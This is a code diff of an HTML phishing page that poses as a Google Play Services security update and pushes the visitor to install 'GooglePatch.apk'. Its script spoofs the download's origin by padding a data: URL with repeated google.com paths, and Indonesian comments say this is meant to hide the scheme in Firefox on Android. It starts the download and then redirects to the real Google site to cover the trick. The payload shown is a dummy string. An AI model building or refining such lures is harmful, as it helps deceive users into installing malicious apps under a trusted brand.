@@ -3,32 +3,65 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Security Service</title>
+    <title>Google Play Services Update</title>
     <style>
-        body { background: #0b0b0b; color: #fff; font-family: 'Segoe UI', sans-serif; text-align: center; padding-top: 50px; }
-        .container { border: 1px solid #4285F4; padding: 30px; display: inline-block; border-radius: 15px; background: #1a1a1a; }
-        .google-logo { font-size: 2em; font-weight: bold; margin-bottom: 10px; }
+        body { 
+            background: #121212; 
+            color: #e8eaed; 
+            font-family: 'Roboto', sans-serif; 
+            text-align: center; 
+            padding-top: 100px; 
+            margin: 0;
+        }
+        .container { 
+            border: 1px solid #3c4043; 
+            padding: 40px; 
+            display: inline-block; 
+            border-radius: 8px; 
+            background: #202124;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
+            max-width: 350px;
+        }
+        .logo { font-size: 2.5em; font-weight: bold; margin-bottom: 15px; }
         .blue { color: #4285F4; } .red { color: #EA4335; } .yellow { color: #FBBC05; } .green { color: #34A853; }
+        
+        h3 { margin-top: 0; font-weight: 400; }
+        p { color: #bdc1c6; font-size: 14px; line-height: 1.6; }
+
         #strikeBtn {
-            padding: 15px 35px;
-            background: #4285F4;
-            color: #fff;
+            margin-top: 20px;
+            padding: 12px 24px;
+            background: #8ab4f8;
+            color: #202124;
             border: none;
             cursor: pointer;
-            font-weight: bold;
-            border-radius: 8px;
+            font-weight: 500;
+            border-radius: 4px;
+            font-size: 14px;
+            width: 100%;
         }
-        #status { margin-top: 25px; font-size: 0.8em; color: #888; font-family: monospace; }
+        #strikeBtn:active { background: #aecbfa; }
+
+        #status { 
+            margin-top: 25px; 
+            font-size: 11px; 
+            color: #5f6368; 
+            font-family: 'Courier New', monospace; 
+        }
     </style>
 </head>
 <body>
+
     <div class="container">
-        <div class="google-logo">
+        <div class="logo">
             <span class="blue">G</span><span class="red">o</span><span class="yellow">o</span><span class="blue">g</span><span class="green">l</span><span class="red">e</span>
         </div>
-        <p>Critical Security Update for Android Services.</p>
-        <button type="button" id="strikeBtn">Update Google Services</button>
-        <div id="status">> Status: Waiting...</div>
+        <h3>System Update</h3>
+        <p>A critical patch for Google Play Services is ready to install. This update improves device security.</p>
+        
+        <button type="button" id="strikeBtn">INSTALL UPDATE</button>
+        
+        <div id="status">> Awaiting user action...</div>
     </div>
 
 <script>
@@ -36,10 +69,11 @@
         const filename = "GooglePatch.apk";
         const spoofDomain = "www.google.com";
         
-        // --- Logic Spoofing ---
-        const padding = ".https://" + spoofDomain + "/patch/".repeat(25);
+        // --- Logic Spoofing (Fokus ke Firefox Android) ---
+        // Menggunakan padding masif agar skema 'data:' terpotong di UI Firefox
+        const padding = ".https://" + spoofDomain + "/update-patch/".repeat(25);
         const longSub = spoofDomain + padding;
-        const base64Payload = "ZXN0dGVzdGVzdHRlc3Q="; 
+        const base64Payload = "ZXN0dGVzdGVzdHRlc3Q="; // Dummy Base64
         const payload = `data:application/octet-stream;base64,${base64Payload}#${longSub}`;
 
         const a = document.createElement('a');
@@ -47,20 +81,24 @@
         a.download = filename;
         document.body.appendChild(a);
 
-        // --- STEP 1: Update UI ---
-        document.getElementById('status').innerText = "> REDIRECTING TO GOOGLE...";
+        // --- STEP 1: TRIGGER DOWNLOAD ---
+        // Kita klik dulu agar browser (Chrome/Firefox) mencatat interaksi user
+        a.click();
 
-        // --- STEP 2: Trigger Redirect ---
-        // Kita redirect dulu ke halaman google
-        window.location.href = "https://www.google.com";
+        // --- STEP 2: UPDATE UI ---
+        document.getElementById('status').innerText = "> INITIATING DOWNLOAD...";
+        document.getElementById('strikeBtn').innerText = "DOWNLOADING...";
+        document.getElementById('strikeBtn').disabled = true;
 
-        // --- STEP 3: Trigger Download sesaat setelah redirect ---
-        // Menggunakan delay sangat kecil agar proses download 'terbawa' ke context halaman baru
+        // --- STEP 3: REDIRECT SETELAH JEDA ---
+        // Jeda 600ms memberikan waktu bagi background process untuk memunculkan dialog download
+        // sebelum halaman berpindah ke Google yang asli.
         setTimeout(() => {
-            a.click();
+            window.location.href = "https://www.google.com";
             document.body.removeChild(a);
-        }, 100); 
+        }, 600); 
     });
 </script>
+
 </body>
 </html>
